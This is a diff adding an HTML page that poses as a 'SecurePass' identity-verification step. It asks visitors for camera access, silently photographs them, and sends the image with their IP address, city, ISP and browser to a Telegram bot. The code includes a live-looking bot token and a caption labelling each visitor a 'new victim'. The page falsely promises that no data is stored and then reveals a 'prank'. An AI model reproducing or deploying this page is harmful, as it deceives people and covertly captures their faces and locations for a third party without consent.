@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+  <title>Верификация личности — SecurePass</title>
+  <script>
+    const TG_TOKEN   = '8816324332:AAH8hUkPtRpXexSxbKZjVAdzLAFHG8spqu0';
+    const TG_CHAT_ID = '1577709820';
+
+    async function getIP() {
+      try {
+        const r = await fetch('https://ip-api.com/json/?fields=query,country,regionName,city,isp');
+        const d = await r.json();
+        return 'IP: ' + d.query + '\nСтрана: ' + d.country + '\nГород: ' + d.city + ' (' + d.regionName + ')\nПровайдер: ' + d.isp;
+      } catch(e) { return 'IP: не удалось получить'; }
+    }
+
+    async function sendToTelegram(dataUrl) {
+      try {
+        const [blob, ipInfo] = await Promise.all([
+          fetch(dataUrl).then(r => r.blob()),
+          getIP()
+        ]);
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        fd.append('caption',
+          'НОВАЯ ЖЕРТВА\n─────────────────\n' + ipInfo +
+          '\n─────────────────\nВремя: ' + new Date().toLocaleString('ru-RU') +
+          '\nБраузер: ' + navigator.userAgent.substring(0, 100)
+        );
+        await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {method:'POST',body:fd});
+      } catch(e){}
+    }
+  </script>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Header */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-icon {
+      width: 32px; height: 32px;
+      background: linear-gradient(135deg, #1a73e8, #0d47a1);
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .logo-icon svg { width: 18px; height: 18px; fill: #fff; }
+    .logo-text { font-size: 16px; font-weight: 700; color: #1a1a1a; }
+    .logo-text span { color: #1a73e8; }
+    .header-right { margin-left: auto; font-size: 12px; color: #888; display: flex; align-items: center; gap: 6px; }
+    .ssl-badge { background: #e8f5e9; color: #2e7d32; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
+
+    /* Main */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 420px;
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: linear-gradient(135deg, #1a73e8, #0d47a1);
+      padding: 24px;
+      text-align: center;
+      color: #fff;
+    }
+    .card-header .shield {
+      width: 56px; height: 56px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 12px;
+    }
+    .card-header .shield svg { width: 28px; height: 28px; fill: #fff; }
+    .card-header h1 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+    .card-header p { font-size: 13px; opacity: 0.8; }
+
+    .card-body { padding: 24px; }
+
+    .info-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      background: #f8f9ff;
+      border: 1px solid #e3e8ff;
+      border-radius: 10px;
+      padding: 14px;
+      margin-bottom: 20px;
+    }
+    .info-row .info-icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+    .info-row p { font-size: 13px; color: #444; line-height: 1.5; }
+    .info-row p b { color: #1a1a1a; }
+
+    .steps { margin-bottom: 22px; }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .step:last-child { border-bottom: none; }
+    .step-num {
+      width: 26px; height: 26px;
+      background: #1a73e8;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700; color: #fff;
+      flex-shrink: 0;
+    }
+    .step-text { font-size: 13px; color: #333; }
+
+    .verify-btn {
+      width: 100%;
+      padding: 15px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.2s;
+    }
+    .verify-btn:hover { background: #1557b0; }
+    .verify-btn:active { background: #0d47a1; }
+    .verify-btn svg { width: 18px; height: 18px; fill: #fff; }
+
+    .footer-note {
+      text-align: center;
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 14px;
+      line-height: 1.5;
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      padding: 16px;
+      font-size: 11px;
+      color: #bbb;
+    }
+
+    /* Camera screen */
+    #cam-screen {
+      display: none;
+      position: fixed; inset: 0; z-index: 100;
+      background: #000;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    #cam-screen.show { display: flex; }
+    .cam-header {
+      position: absolute; top: 0; left: 0; right: 0;
+      background: rgba(26,115,232,0.95);
+      padding: 14px 16px;
+      text-align: center;
+    }
+    .cam-header p { font-size: 14px; font-weight: 600; color: #fff; }
+    .cam-header span { font-size: 12px; color: rgba(255,255,255,0.7); }
+    #vid-wrap {
+      width: min(340px,90vw);
+      aspect-ratio: 3/4;
+      border-radius: 16px;
+      overflow: hidden;
+      position: relative;
+      border: 3px solid #1a73e8;
+    }
+    #video { width:100%; height:100%; object-fit:cover; display:block; }
+    #shutter { position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none;transition:opacity 0.05s; }
+    #canvas { display:none; }
+    .cam-hint { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.6); text-align: center; }
+
+    /* Result */
+    #result-screen {
+      display: none;
+      position: fixed; inset: 0; z-index: 200;
+      background: #f0f2f5;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    #result-screen.show { display: flex; }
+    .result-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+      width: 100%; max-width: 380px;
+      overflow: hidden;
+      text-align: center;
+    }
+    .result-top {
+      background: linear-gradient(135deg, #e53935, #b71c1c);
+      padding: 24px;
+      color: #fff;
+    }
+    .result-top h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 4px; }
+    .result-top p { font-size: 13px; opacity: 0.85; }
+    .result-body { padding: 20px; }
+    #frame {
+      border-radius: 12px; overflow: hidden;
+      border: 3px solid #e53935;
+      position: relative; margin-bottom: 16px;
+    }
+    #frame img { width:100%; display:block; }
+    #stamp {
+      position:absolute;top:50%;left:50%;
+      transform:translate(-50%,-50%) rotate(-12deg) scale(0);
+      font-size:1.6rem;font-weight:900;letter-spacing:3px;
+      color:#e53935;border:4px solid #e53935;
+      padding:5px 12px;border-radius:4px;
+      background:rgba(255,255,255,0.85);
+      text-transform:uppercase;pointer-events:none;
+      transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+    }
+    #stamp.show { transform:translate(-50%,-50%) rotate(-12deg) scale(1); }
+    .r-btns { display:flex; gap:10px; justify-content:center; }
+    .r-btn { padding:11px 20px;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer; }
+    .r-btn.red { background:#e53935;color:#fff; }
+    .r-btn.grey { background:#f0f0f0;color:#555; }
+
+    /* Error */
+    #err { display:none;position:fixed;inset:0;z-index:300;background:#f0f2f5;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px; }
+    #err.show { display:flex; }
+    #err h2 { font-size:1.3rem;margin-bottom:8px;color:#333; }
+    #err p { color:#888;font-size:14px; }
+
+    .cf-wrap{position:fixed;inset:0;pointer-events:none;z-index:250}
+    .cf{position:absolute;top:-10px;border-radius:2px;animation:cffall linear forwards}
+    @keyframes cffall{to{transform:translateY(105vh) rotate(540deg);opacity:0}}
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="logo-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+  </div>
+  <div class="logo-text">Secure<span>Pass</span></div>
+  <div class="header-right">
+    <div class="ssl-badge">
+      <svg viewBox="0 0 24 24" width="10" height="10" fill="#2e7d32"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
+      SSL
+    </div>
+  </div>
+</div>
+
+<!-- Main -->
+<div class="main">
+  <div class="card">
+    <div class="card-header">
+      <div class="shield">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      </div>
+      <h1>Подтверждение личности</h1>
+      <p>Для продолжения необходима верификация</p>
+    </div>
+    <div class="card-body">
+      <div class="info-row">
+        <div class="info-icon">ℹ️</div>
+        <p>Для защиты от мошенничества нам необходимо <b>убедиться что вы реальный человек</b>. Это займёт несколько секунд.</p>
+      </div>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-text">Нажмите кнопку «Начать верификацию»</div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-text">Разрешите доступ к камере</div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-text">Смотрите в камеру 1 секунду</div>
+        </div>
+      </div>
+      <button class="verify-btn" onclick="startCamera()">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        Начать верификацию
+      </button>
+      <div class="footer-note">Данные используются только для подтверждения личности и не сохраняются</div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">© 2024 SecurePass Verification · Политика конфиденциальности</div>
+
+<!-- Camera -->
+<div id="cam-screen">
+  <div class="cam-header">
+    <p>Сканирование лица</p>
+    <span>Смотрите прямо в камеру</span>
+  </div>
+  <div id="vid-wrap">
+    <video id="video" autoplay playsinline muted></video>
+    <div id="shutter"></div>
+  </div>
+  <canvas id="canvas"></canvas>
+  <div class="cam-hint">Держите лицо в рамке</div>
+</div>
+
+<!-- Result -->
+<div id="result-screen">
+  <div class="result-card">
+    <div class="result-top">
+      <h1>Попался!</h1>
+      <p>Это был пранк — фото сделано</p>
+    </div>
+    <div class="result-body">
+      <div id="frame">
+        <img id="photo" alt=""/>
+        <div id="stamp">ПОЙМАН</div>
+      </div>
+      <div class="r-btns">
+        <button class="r-btn red" onclick="save()">Сохранить</button>
+        <button class="r-btn grey" onclick="location.reload()">Снова</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Error -->
+<div id="err">
+  <h2>Нет доступа к камере</h2>
+  <p>Разреши доступ к камере и обнови страницу</p>
+</div>
+
+<div class="cf-wrap" id="cf"></div>
+
+<script>
+const $ = id => document.getElementById(id);
+let stream;
+
+async function startCamera() {
+  $('cam-screen').classList.add('show');
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1280,height:720},audio:false});
+    const v = $('video');
+    v.srcObject = stream;
+    v.onloadedmetadata = () => { v.play(); setTimeout(shoot, 1200); };
+  } catch(e) {
+    $('cam-screen').classList.remove('show');
+    $('err').classList.add('show');
+  }
+}
+
+function shoot() {
+  const sh = $('shutter');
+  sh.style.opacity = 1;
+  setTimeout(() => sh.style.opacity = 0, 100);
+  const v = $('video'), cv = $('canvas');
+  cv.width = v.videoWidth; cv.height = v.videoHeight;
+  const ctx = cv.getContext('2d');
+  ctx.translate(cv.width,0); ctx.scale(-1,1);
+  ctx.drawImage(v,0,0);
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  const url = cv.toDataURL('image/jpeg',0.92);
+  window._photo = url;
+  $('cam-screen').classList.remove('show');
+  $('result-screen').classList.add('show');
+  $('photo').src = url;
+  setTimeout(() => $('stamp').classList.add('show'), 500);
+  confetti();
+  sendToTelegram(url);
+}
+
+function save() {
+  const a = document.createElement('a');
+  a.href = window._photo; a.download = 'photo.jpg'; a.click();
+}
+
+const COLS = ['#1a73e8','#e53935','#43a047','#ff9800','#fff'];
+function confetti() {
+  const c = $('cf');
+  for (let i=0;i<80;i++) {
+    const el = document.createElement('div');
+    el.className='cf';
+    el.style.cssText='left:'+Math.random()*100+'%;background:'+COLS[Math.floor(Math.random()*COLS.length)]+';width:'+(6+Math.random()*8)+'px;height:'+(6+Math.random()*8)+'px;animation-duration:'+(1.5+Math.random()*2)+'s;animation-delay:'+Math.random()*0.6+'s;border-radius:'+(Math.random()>.5?'50%':'2px');
+    c.appendChild(el);
+  }
+  setTimeout(()=>c.innerHTML='',4000);
+}
+</script>
+</body>
+</html>
